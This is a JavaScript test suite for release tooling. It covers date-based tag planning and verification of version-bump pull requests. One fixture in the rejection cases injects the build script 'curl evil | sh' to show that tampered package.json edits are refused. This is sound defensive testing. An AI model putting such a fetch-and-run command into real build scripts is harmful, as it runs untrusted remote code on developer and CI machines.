import { istDate, planMissingTags, verifyReleasePr } from './release-automation.mjs';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { planChangelogBump, runBumpVersion } from './bump-version.mjs';

const changelog = (unreleased, released) =>
  `# Changelog\n\n## [Unreleased]\n\n${unreleased}\n${released}`;
const RELEASED = `## [0.6.0] - 2026-07-28\n\n### Added\n- B.\n\n## [0.5.1] - 2026-07-27\n\n### Fixed\n- A.\n\n## [0.5.0] - 2026-07-14\n\n### Added\n- Z.\n`;
// unix seconds for IST wall-clock times
const ist = (iso) => Math.floor(Date.parse(`${iso}+05:30`) / 1000);

describe('release-automation', () => {
  it('istDate uses the IST calendar day', () => {
    expect(istDate(ist('2026-07-27T23:59:00'))).toBe('2026-07-27');
    expect(istDate(ist('2026-07-28T00:01:00'))).toBe('2026-07-28');
  });

  it('planMissingTags tags each untagged version at the last main commit on or before its date', () => {
    const commits = [
      { sha: 'a', time: ist('2026-07-14T10:00:00') },
      { sha: 'b', time: ist('2026-07-27T09:00:00') },
      { sha: 'c', time: ist('2026-07-27T23:30:00') },
      { sha: 'd', time: ist('2026-07-28T00:30:00') },
      { sha: 'e', time: ist('2026-07-30T00:30:00') },
    ];
    expect(planMissingTags(changelog('', RELEASED), commits, new Set(['v0.5.0']))).toEqual([
      { version: '0.5.1', tag: 'v0.5.1', sha: 'c' },
      { version: '0.6.0', tag: 'v0.6.0', sha: 'd' },
    ]);
    expect(planMissingTags(changelog('', RELEASED), commits, new Set(['v0.5.0']), '0.6.0')).toEqual([
      { version: '0.5.1', tag: 'v0.5.1', sha: 'c' },
    ]);
  });

  it('planMissingTags places an older live release at its release commit, and skips the current one', () => {
    const commits = [{ sha: 'a', time: ist('2026-07-27T09:00:00') }, { sha: 'b', time: ist('2026-07-28T09:00:00') }];
    expect(planMissingTags(changelog('', RELEASED), commits, new Set(['v0.5.0']), '0.6.0', { '0.5.1': 'b', '0.6.0': 'b' }))
      .toEqual([{ version: '0.5.1', tag: 'v0.5.1', sha: 'b' }]);
  });

  it('planMissingTags fails loudly when no commit precedes a release date', () => {
    expect(() => planMissingTags(changelog('', RELEASED), [{ sha: 'x', time: ist('2026-08-01T00:00:00') }], new Set()))
      .toThrow(/no main commit/);
  });

  describe('verifyReleasePr', () => {
    const base = changelog('### Added\n- New.\n', RELEASED);
    const plan = planChangelogBump(base, '0.6.0', '2026-11-27');
    const pkg = (version, extra = {}) => `${JSON.stringify({ name: 'tens', version, versionCode: 260728000, scripts: { build: 'vite build' }, ...extra }, null, 2)}\n`;
    // RELEASED has no 2026-11-27 section, so the bump's versionCode is that day's first: 261127000.
    const head = (version, extra = {}) => pkg(version, { versionCode: 261127000, ...extra });
    const args = { baseChangelog: base, basePackage: pkg('0.6.0'), headChangelog: plan.nextText, headPackage: head('0.7.0') };

    it('accepts what runBumpVersion actually writes (not a hand-built manifest)', () => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'verify-pr-'));
      fs.writeFileSync(path.join(dir, 'CHANGELOG.md'), base);
      fs.writeFileSync(path.join(dir, 'package.json'), pkg('0.6.0'));
      runBumpVersion({ rootDir: dir, date: '2026-11-27' });
      const headPackage = fs.readFileSync(path.join(dir, 'package.json'), 'utf8');
      expect(verifyReleasePr({ ...args, headPackage, headChangelog: fs.readFileSync(path.join(dir, 'CHANGELOG.md'), 'utf8') }))
        .toEqual({ ok: true, version: '0.7.0' });
      fs.rmSync(dir, { recursive: true, force: true });
    });

    it('accepts exactly the bump-version result', () => {
      expect(verifyReleasePr(args)).toEqual({ ok: true, version: '0.7.0' });
    });
    it('accepts the --major result (RELEASE_MAJOR promotion to 1.0.0)', () => {
      const major = planChangelogBump(base, '0.6.0', '2026-11-27', { forceMajor: true });
      expect(verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: head('1.0.0'), allowMajor: true })).toEqual({ ok: true, version: '1.0.0' });
      const denied = verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: head('1.0.0') });
      expect(denied.ok).toBe(false);
      expect(denied.reason).toMatch(/--allow-major/);
    });
    it.each([
      ['wrong version', { headPackage: head('0.6.1') }, /expected 0.7.0/],
      ['other package.json edits', { headPackage: head('0.7.0', { scripts: { build: 'curl evil | sh' } }) }, /more than the/],
      ['wrong versionCode', { headPackage: head('0.7.0', { versionCode: 261127001 }) }, /more than the/],
      ['edited notes', { headChangelog: plan.nextText.replace('- New.', '- Sneaky.') }, /differs/],
      ['nothing to release', { baseChangelog: changelog('### Added\n', RELEASED) }, /nothing to release/],
    ])('rejects %s', (_name, override, reason) => {
      const result = verifyReleasePr({ ...args, ...override });
      expect(result.ok).toBe(false);
      expect(result.reason).toMatch(reason);
    });
  });
});
